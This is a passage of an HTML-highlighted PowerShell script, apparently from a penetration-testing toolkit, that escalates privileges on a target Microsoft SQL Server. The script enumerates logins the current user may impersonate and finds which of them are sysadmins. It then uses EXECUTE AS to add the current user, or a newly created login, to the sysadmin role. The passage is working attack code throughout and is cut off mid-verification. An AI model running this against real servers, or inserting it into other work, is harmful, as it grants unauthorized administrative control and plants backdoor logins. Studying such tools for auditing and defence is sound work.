<span class="w">    </span><span class="n">HelpMessage</span><span class="p">=</span><span class="s">&#39;Execute query under impersonated user context.&#39;</span><span class="p">)]</span>
<span class="w">    </span><span class="p">[</span><span class="nb">string</span><span class="p">]</span>$<span class="n">Query</span><span class="p">,</span>

<span class="w">    </span><span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Mandatory</span><span class="p">=</span>$<span class="nb">true</span><span class="p">,</span>
<span class="w">    </span><span class="n">HelpMessage</span><span class="p">=</span><span class="s">&#39;Set target SQL Server instance.&#39;</span><span class="p">)]</span>
<span class="w">    </span><span class="p">[</span><span class="nb">string</span><span class="p">]</span>$<span class="n">SqlServerInstance</span>

<span class="w">  </span><span class="p">)</span>

<span class="w">    </span>#<span class="w"> </span><span class="o">-----------------------------------------------</span>
<span class="w">    </span>#<span class="w"> </span><span class="n">Setup</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="nb">string</span>
<span class="w">    </span>#<span class="w"> </span><span class="o">-----------------------------------------------</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Create</span><span class="w"> </span><span class="n">fun</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="n">object</span>
<span class="w">    </span>$<span class="n">conn</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">New</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">SqlClient</span><span class="p">.</span><span class="n">SqlConnection</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Set</span><span class="w"> </span><span class="n">authentication</span><span class="w"> </span><span class="nb">type</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">create</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="nb">string</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span>$<span class="n">SqlUser</span><span class="p">){</span>

<span class="w">        </span>#<span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">alternative</span><span class="w"> </span><span class="n">domain</span><span class="w"> </span><span class="n">credentials</span>
<span class="w">         </span><span class="n">Write</span><span class="o">-</span><span class="n">Output</span><span class="w"> </span><span class="s">&quot;[*] Attempting to authenticate to $SqlServerInstance with SQL login $SqlUser...&quot;</span>
<span class="w">        </span>$<span class="n">conn</span><span class="p">.</span><span class="n">ConnectionString</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;Server=$SqlServerInstance;Database=master;User ID=$SqlUser;Password=$SqlPass;&quot;</span>
<span class="w">        </span><span class="p">[</span><span class="nb">string</span><span class="p">]</span>$<span class="n">ConnectUser</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">SqlUser</span>
<span class="w">    </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>

<span class="w">        </span>#<span class="w"> </span><span class="n">Trusted</span><span class="w"> </span><span class="n">connection</span>
<span class="w">        </span><span class="n">Write</span><span class="o">-</span><span class="n">Output</span><span class="w"> </span><span class="s">&quot;[*] Attempting to authenticate to $SqlServerInstance as the current Windows user...&quot;</span>
<span class="w">        </span>$<span class="n">conn</span><span class="p">.</span><span class="n">ConnectionString</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;Server=$SqlServerInstance;Database=master;Integrated Security=SSPI;&quot;</span><span class="w">   </span>
<span class="w">        </span>$<span class="n">UserDomain</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">[</span><span class="n">Environment</span><span class="p">]::</span><span class="n">UserDomainName</span>
<span class="w">        </span>$<span class="n">Username</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">[</span><span class="n">Environment</span><span class="p">]::</span><span class="n">UserName</span>
<span class="w">        </span>$<span class="n">ConnectUser</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;$UserDomain\$Username&quot;</span><span class="w">                    </span>
<span class="w">     </span><span class="p">}</span>


<span class="w">    </span>#<span class="w"> </span><span class="o">-----------------------------------------------</span>
<span class="w">    </span>#<span class="w"> </span><span class="nb">Test</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="n">connection</span>
<span class="w">    </span>#<span class="w"> </span><span class="o">-----------------------------------------------</span>
<span class="w">    </span><span class="k">try</span><span class="p">{</span>
<span class="w">        </span>$<span class="n">conn</span><span class="p">.</span><span class="n">Open</span><span class="p">()</span>
<span class="w">        </span><span class="n">Write</span><span class="o">-</span><span class="n">Host</span><span class="w"> </span><span class="s">&quot;[*] Connected.&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">foreground</span><span class="w"> </span><span class="s">&quot;green&quot;</span>
<span class="w">        </span>$<span class="n">conn</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
<span class="w">    </span><span class="p">}</span><span class="k">catch</span><span class="p">{</span>
<span class="w">        </span>$<span class="n">ErrorMessage</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">_</span><span class="p">.</span><span class="n">Exception</span><span class="p">.</span><span class="n">Message</span>
<span class="w">        </span><span class="n">Write</span><span class="o">-</span><span class="n">Host</span><span class="w"> </span><span class="s">&quot;[*] Connection failed&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">foreground</span><span class="w"> </span><span class="s">&quot;red&quot;</span>
<span class="w">        </span><span class="n">Write</span><span class="o">-</span><span class="n">Host</span><span class="w"> </span><span class="s">&quot;[*] Error: $ErrorMessage&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">foreground</span><span class="w"> </span><span class="s">&quot;red&quot;</span><span class="w">  </span>
<span class="w">        </span><span class="n">Break</span>
<span class="w">    </span><span class="p">}</span>


<span class="w">    </span>#<span class="w"> </span><span class="o">-----------------------------------------------</span>
<span class="w">    </span>#<span class="w"> </span><span class="n">Check</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">already</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">sysadmin</span>
<span class="w">    </span>#<span class="w"> </span><span class="o">-----------------------------------------------</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Open</span><span class="w"> </span><span class="n">db</span><span class="w"> </span><span class="n">connection</span>
<span class="w">    </span>$<span class="n">conn</span><span class="p">.</span><span class="n">Open</span><span class="p">()</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Setup</span><span class="w"> </span><span class="n">query</span>
<span class="w">    </span>$<span class="n">Query</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;select is_srvrolemember(&#39;sysadmin&#39;) as sysstatus&quot;</span>

<span class="w">    </span>#<span class="w"> </span><span class="nb">Execute</span><span class="w"> </span><span class="n">query</span>
<span class="w">    </span>$<span class="n">cmd</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">New</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">SqlClient</span><span class="p">.</span><span class="n">SqlCommand</span><span class="p">(</span>$<span class="n">Query</span><span class="p">,</span>$<span class="n">conn</span><span class="p">)</span>
<span class="w">    </span>$<span class="n">results</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">cmd</span><span class="p">.</span><span class="n">ExecuteReader</span><span class="p">()</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Parse</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">results</span>
<span class="w">    </span>$<span class="n">TableIsSysAdmin</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">New</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">DataTable</span>
<span class="w">    </span>$<span class="n">TableIsSysAdmin</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span>$<span class="n">results</span><span class="p">)</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Check</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">current</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">sysadmin</span>
<span class="w">    </span>$<span class="n">TableIsSysAdmin</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="o">-</span><span class="n">First</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">sysstatus</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">foreach</span><span class="w"> </span><span class="p">{</span>

<span class="w">        </span>$<span class="n">Checksysadmin</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">_</span><span class="p">.</span><span class="n">sysstatus</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span>$<span class="n">Checksysadmin</span><span class="w"> </span><span class="o">-</span><span class="n">ne</span><span class="w"> </span><span class="mi">0</span><span class="p">){</span>
<span class="w">                </span><span class="n">Write</span><span class="o">-</span><span class="n">Host</span><span class="w"> </span><span class="s">&quot;[*] You&#39;re already a sysadmin - no escalation needed.&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">foreground</span><span class="w"> </span><span class="s">&quot;green&quot;</span>
<span class="w">                </span><span class="n">Write</span><span class="o">-</span><span class="n">Host</span><span class="w"> </span><span class="s">&quot;[*] All Done.&quot;</span>
<span class="w">                </span><span class="n">Break</span><span class="w">             </span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Close</span><span class="w"> </span><span class="n">db</span><span class="w"> </span><span class="n">connection</span>
<span class="w">    </span>$<span class="n">conn</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>

<span class="w">    </span>#<span class="w"> </span><span class="o">-----------------------------------------------</span>
<span class="w">    </span>#<span class="w"> </span><span class="n">Get</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">impersonated</span>
<span class="w">    </span>#<span class="w"> </span><span class="o">-----------------------------------------------</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">User</span><span class="w"> </span><span class="n">status</span>
<span class="w">    </span><span class="n">Write</span><span class="o">-</span><span class="n">Host</span><span class="w"> </span><span class="s">&quot;[*] Enumerating a list of users that can be impersonated...&quot;</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Open</span><span class="w"> </span><span class="n">db</span><span class="w"> </span><span class="n">connection</span>
<span class="w">    </span>$<span class="n">conn</span><span class="p">.</span><span class="n">Open</span><span class="p">()</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Setup</span><span class="w"> </span><span class="n">query</span>
<span class="w">    </span>$<span class="n">QueryDatabases</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;SELECT DISTINCT b.name</span>
<span class="s">    FROM sys.server_permissions a</span>
<span class="s">    INNER JOIN sys.server_principals b</span>
<span class="s">    ON a.grantor_principal_id = b.principal_id </span>
<span class="s">    WHERE a.permission_name = &#39;IMPERSONATE&#39;&quot;</span>

<span class="w">    </span>#<span class="w"> </span><span class="nb">Execute</span><span class="w"> </span><span class="n">query</span><span class="w">    </span>
<span class="w">    </span>$<span class="n">cmd</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">New</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">SqlClient</span><span class="p">.</span><span class="n">SqlCommand</span><span class="p">(</span>$<span class="n">QueryDatabases</span><span class="p">,</span>$<span class="n">conn</span><span class="p">)</span>
<span class="w">    </span>$<span class="n">results</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">cmd</span><span class="p">.</span><span class="n">ExecuteReader</span><span class="p">()</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Parse</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">results</span>
<span class="w">    </span>$<span class="n">TableImpUsers</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">New</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">DataTable</span><span class="w"> </span>
<span class="w">    </span>$<span class="n">TableImpUsers</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span>$<span class="n">results</span><span class="p">)</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Check</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="nb">any</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">impersonated</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span>$<span class="n">TableImpUsers</span><span class="p">.</span><span class="n">rows</span><span class="p">.</span><span class="n">count</span><span class="w"> </span><span class="o">-</span><span class="nb">eq</span><span class="w"> </span><span class="mi">0</span><span class="p">){</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="n">user</span>
<span class="w">    </span><span class="n">Write</span><span class="o">-</span><span class="n">Host</span><span class="w"> </span><span class="s">&quot;[*] Sorry, the current user doesn&#39;t have permissions to impersonate anyone.&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">foreground</span><span class="w"> </span><span class="s">&quot;red&quot;</span>
<span class="w">        </span><span class="n">Write</span><span class="o">-</span><span class="n">Host</span><span class="w"> </span><span class="s">&quot;[*] All done.&quot;</span><span class="w"> </span>
<span class="w">        </span><span class="k">break</span>
<span class="w">    </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>

<span class="w">        </span>#<span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="n">user</span><span class="w">   </span>
<span class="w">    </span>$<span class="n">ImpUserCount</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">TableImpUsers</span><span class="p">.</span><span class="n">rows</span><span class="p">.</span><span class="n">count</span><span class="w">      </span>
<span class="w">    </span><span class="n">Write</span><span class="o">-</span><span class="n">Host</span><span class="w"> </span><span class="s">&quot;[*] Found $ImpUserCount users that can be impersonated:&quot;</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Display</span><span class="w"> </span><span class="n">users</span>
<span class="w">        </span>$<span class="n">TableImpUsers</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">foreach</span><span class="p">{</span>
<span class="w">            </span>$<span class="n">ImpUser</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">_</span><span class="p">.</span><span class="n">name</span>
<span class="w">            </span><span class="n">Write</span><span class="o">-</span><span class="n">Host</span><span class="w"> </span><span class="s">&quot;[*] - $ImpUser&quot;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Close</span><span class="w"> </span><span class="n">db</span><span class="w"> </span><span class="n">connection</span>
<span class="w">    </span>$<span class="n">conn</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>

<span class="w">    </span>#<span class="w"> </span><span class="o">----------------------------------------------------------------</span>
<span class="w">    </span>#<span class="w"> </span><span class="n">Check</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="nb">any</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">impersonated</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">sysadmins</span>
<span class="w">    </span>#<span class="w"> </span><span class="o">----------------------------------------------------------------</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span>$<span class="n">TableImpUsers</span><span class="p">.</span><span class="n">rows</span><span class="p">.</span><span class="n">count</span><span class="w"> </span><span class="o">-</span><span class="n">ne</span><span class="w"> </span><span class="mi">0</span><span class="p">){</span>

<span class="w">        </span>#<span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="n">user</span>
<span class="w">        </span><span class="n">Write</span><span class="o">-</span><span class="n">Host</span><span class="w"> </span><span class="s">&quot;[*] Checking if any of them are sysadmins...&quot;</span>

<span class="w">        </span>#<span class="w"> </span><span class="n">Setup</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="nb">table</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">store</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">sysadmins</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">impersonated</span>
<span class="w">        </span>$<span class="n">TableImpUserSysAdmins</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">New</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">DataTable</span>
<span class="w">        </span>$<span class="n">TableImpUserSysAdmins</span><span class="p">.</span><span class="n">Columns</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s">&#39;name&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out</span><span class="o">-</span><span class="n">Null</span>

<span class="w">        </span>$<span class="n">TableImpUsers</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">foreach</span><span class="w"> </span><span class="p">{</span>

<span class="w">            </span>#<span class="w"> </span><span class="n">Open</span><span class="w"> </span><span class="n">db</span><span class="w"> </span><span class="n">connection</span>
<span class="w">            </span>$<span class="n">conn</span><span class="p">.</span><span class="n">Open</span><span class="p">()</span>

<span class="w">            </span>#<span class="w"> </span><span class="n">Setup</span><span class="w"> </span><span class="n">query</span>
<span class="w">            </span>$<span class="n">ImpUser</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">_</span><span class="p">.</span><span class="n">name</span>
<span class="w">            </span>$<span class="n">Query</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;select IS_SRVROLEMEMBER(&#39;sysadmin&#39;,&#39;$ImpUser&#39;) as status&quot;</span>

<span class="w">            </span>#<span class="w"> </span><span class="nb">Execute</span><span class="w"> </span><span class="n">query</span>
<span class="w">        </span>$<span class="n">cmd</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">New</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">SqlClient</span><span class="p">.</span><span class="n">SqlCommand</span><span class="p">(</span>$<span class="n">Query</span><span class="p">,</span>$<span class="n">conn</span><span class="p">)</span>
<span class="w">        </span>$<span class="n">results</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">cmd</span><span class="p">.</span><span class="n">ExecuteReader</span><span class="p">()</span>

<span class="w">            </span>#<span class="w"> </span><span class="n">Parse</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">results</span>
<span class="w">            </span>$<span class="n">TableImpUserSysAdminsCheck</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">New</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">DataTable</span><span class="w"> </span>
<span class="w">            </span>$<span class="n">TableImpUserSysAdminsCheck</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span>$<span class="n">results</span><span class="p">)</span>

<span class="w">            </span>$<span class="n">TableImpUserSysAdminsCheck</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">foreach</span><span class="p">{</span>
<span class="w">            </span>$<span class="n">SysAdminStatus</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">_</span><span class="p">.</span><span class="n">status</span>
<span class="w">            </span><span class="p">}</span>

<span class="w">            </span>#<span class="w"> </span><span class="n">Check</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">impersonatable</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">sysadmin</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span>$<span class="n">SysAdminStatus</span><span class="w"> </span><span class="o">-</span><span class="nb">eq</span><span class="w"> </span><span class="mi">0</span><span class="p">){</span>
<span class="w">                </span><span class="n">Write</span><span class="o">-</span><span class="n">Host</span><span class="w"> </span><span class="s">&quot;[*] - $ImpUser - NOT sysadmin&quot;</span><span class="w"> </span>
<span class="w">            </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="w">                </span><span class="n">Write</span><span class="o">-</span><span class="n">Host</span><span class="w"> </span><span class="s">&quot;[*] - $ImpUser - sysadmin!&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">foreground</span><span class="w"> </span><span class="s">&quot;green&quot;</span>

<span class="w">                </span>#<span class="w"> </span><span class="n">Add</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="nb">table</span>
<span class="w">                </span>$<span class="n">TableImpUserSysAdmins</span><span class="p">.</span><span class="n">Rows</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span>$<span class="n">ImpUser</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out</span><span class="o">-</span><span class="n">Null</span><span class="w">     </span>
<span class="w">            </span><span class="p">}</span>

<span class="w">           </span>#<span class="w"> </span><span class="n">Clear</span><span class="w"> </span><span class="n">check</span>
<span class="w">           </span>$<span class="n">TableImpUserSysAdminsCheck</span><span class="p">.</span><span class="n">Clear</span><span class="p">()</span>

<span class="w">           </span>#<span class="w"> </span><span class="n">Close</span><span class="w"> </span><span class="n">db</span><span class="w"> </span><span class="n">connection</span>
<span class="w">           </span>$<span class="n">conn</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>


<span class="w">    </span>#<span class="w"> </span><span class="o">-------------------------------------------------</span>
<span class="w">    </span>#<span class="w"> </span><span class="n">Attempt</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">escalate</span><span class="w"> </span><span class="n">privileges</span>
<span class="w">    </span>#<span class="w"> </span><span class="o">-------------------------------------------------</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Verify</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">sysadmin</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">impersonated</span>
<span class="w">    </span>$<span class="n">ImpUserSysadminsCount</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">TableImpUserSysAdmins</span><span class="p">.</span><span class="n">rows</span><span class="p">.</span><span class="n">count</span><span class="w"> </span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span>$<span class="n">ImpUserSysadminsCount</span><span class="w"> </span><span class="o">-</span><span class="n">ne</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>

<span class="w">        </span>#<span class="w"> </span><span class="n">Open</span><span class="w"> </span><span class="n">db</span><span class="w"> </span><span class="n">connection</span>
<span class="w">        </span>$<span class="n">conn</span><span class="p">.</span><span class="n">Open</span><span class="p">()</span>

<span class="w">        </span>#<span class="w"> </span><span class="n">Check</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">going</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="nb">add</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">sysadmin</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">elevate</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">current</span><span class="w"> </span><span class="n">one</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">query</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span>$<span class="n">newuser</span><span class="w"> </span><span class="o">-</span><span class="n">and</span><span class="w"> </span>$<span class="n">newPass</span><span class="p">){</span>
<span class="w">            </span>$<span class="n">AddUser</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;CREATE LOGIN $newuser WITH PASSWORD = &#39;$newPass&#39;&quot;</span>
<span class="w">            </span>$<span class="n">UsertoElevate</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">newuser</span>
<span class="w">            </span>$<span class="n">Message</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot; create and&quot;</span>
<span class="w">        </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="w">            </span>$<span class="n">AddUser</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;&quot;</span>
<span class="w">            </span>$<span class="n">UsertoElevate</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">ConnectUser</span>
<span class="w">            </span>$<span class="n">Message</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;&quot;</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span>#<span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="n">user</span>
<span class="w">        </span><span class="n">Write</span><span class="o">-</span><span class="n">Host</span><span class="w"> </span><span class="s">&quot;[*] Attempting to$Message add $UsertoElevate to the sysadmin role via impersonation...&quot;</span>

<span class="w">        </span>#<span class="w"> </span><span class="n">Get</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">sysadmin</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">impersonated</span>
<span class="w">        </span>$<span class="n">TableImpUserSysAdmins</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">foreach</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span>$<span class="n">ImpUser</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">_</span><span class="p">.</span><span class="n">name</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span>#<span class="w"> </span><span class="n">Setup</span><span class="w"> </span><span class="n">query</span>
<span class="w">        </span>$<span class="n">Query</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;EXECUTE AS Login = &#39;$ImpUser&#39;;</span>
<span class="s">        $AddUser;</span>
<span class="s">        EXEC sp_addsrvrolemember &#39;$UsertoElevate&#39;,&#39;sysadmin&#39;;</span>
<span class="s">        SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;,&#39;$UsertoElevate&#39;) as status;&quot;</span>

<span class="w">        </span>#<span class="w"> </span><span class="nb">Execute</span><span class="w"> </span><span class="n">query</span>
<span class="w">        </span>$<span class="n">cmd</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">New</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">SqlClient</span><span class="p">.</span><span class="n">SqlCommand</span><span class="p">(</span>$<span class="n">Query</span><span class="p">,</span>$<span class="n">conn</span><span class="p">)</span>
<span class="w">        </span>$<span class="n">results</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">cmd</span><span class="p">.</span><span class="n">ExecuteReader</span><span class="p">()</span>

<span class="w">        </span>#<span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="n">user</span>
<span class="w">        </span><span class="n">Write</span><span class="o">-</span><span class="n">Host</span><span class="w"> </span><span class="s">&quot;[*] Verifying that $UsertoElevate was added to the sysadmin role...&quot;</span>

<span class="w">        </span>#<span class="w"> </span><span class="n">Parse</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">results</span>
<span class="w">        </span>$<span class="n">TableVerify</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">New</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">DataTable</span>
<span class="w">        </span>$<span class="n">TableVerify</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span>$<span class="n">results</span><span class="p">)</span>

<span class="w">        </span>#<span class="w"> </span><span class="n">Check</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">sysadmin</span>
<span class="w">        </span>$<span class="n">TableVerify</span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="o">-</span><span class="n">First</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">status</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">foreach</span><span class="w"> </span><span class="p">{</span>

<span class="w">            </span>$<span class="n">VerifySysadmin</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">_</span><span class="p">.</span><span class="n">status</span>
